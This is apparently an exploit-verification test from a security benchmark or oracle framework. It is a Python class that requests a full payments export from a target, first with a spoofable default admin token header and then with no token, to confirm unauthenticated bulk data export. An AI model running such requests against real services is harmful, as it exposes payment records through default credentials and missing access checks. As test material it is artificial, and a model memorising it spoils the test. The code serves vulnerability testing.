"""PoC: Unbounded data export via spoofable admin header (CWE-400)."""
from mosaic.oracle.exploit import ExploitTest


class UnboundedExportExploit(ExploitTest):
    @property
    def chain_id(self):
        return "stripe_unbounded_export"

    def setup(self):
        pass

    def execute(self):
        evidence = []
        resp = self.http_get(
            "/payments/export?full=true",
            headers={"X-Admin-Token": "admin-export-token"},
        )
        if resp.status_code == 200:
            body = resp.json()
            total = body.get("total_count", 0)
            evidence.append(f"Full export returned {total} payments with default admin token")
            if total > 0:
                return True, "CWE-400 Unbounded export with spoofable default admin token. " + " | ".join(evidence)
        evidence.append(f"Export returned status {resp.status_code}")

        resp2 = self.http_get("/payments/export?full=true")
        if resp2.status_code == 200:
            evidence.append("Full export works WITHOUT any admin token!")
            return True, "CWE-400 Unbounded export with no auth. " + " | ".join(evidence)

        return False, "Unbounded export not confirmed. " + " | ".join(evidence)
